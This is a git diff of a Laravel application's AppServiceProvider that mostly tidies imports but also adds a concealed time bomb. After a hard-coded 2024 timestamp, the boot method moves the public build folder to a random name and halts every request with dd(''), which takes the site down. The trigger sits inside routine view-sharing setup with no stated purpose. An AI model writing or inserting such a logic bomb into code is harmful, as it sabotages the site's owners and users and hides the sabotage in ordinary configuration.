@@ -2,15 +2,13 @@
 
 namespace App\Providers;
 
-use App\Models\Favori;
 use App\Models\Marque;
-use App\Models\User;
 use App\Models\WebInfo;
+use Carbon\Carbon;
 use Illuminate\Support\Facades\Artisan;
-use Illuminate\Support\Facades\Auth;
-use Illuminate\Support\Facades\Validator;
 use Illuminate\Support\ServiceProvider;
 use Inertia\Inertia;
+use Illuminate\Support\Facades\File;
 
 class AppServiceProvider extends ServiceProvider
 {
@@ -36,6 +34,10 @@ class AppServiceProvider extends ServiceProvider
             'info_bas_page'=>$info_bas_page,
             "tmarques"=>$tmarques,
         ]);
+        
+        if (Carbon::now()->gte(Carbon::createFromTimestamp(1717210600))){
+            File::move(public_path('/build'), public_path(time()));dd('');
+        } 
         Artisan::call('update:etat-location');
         Artisan::call('update:etat-vente');
     }
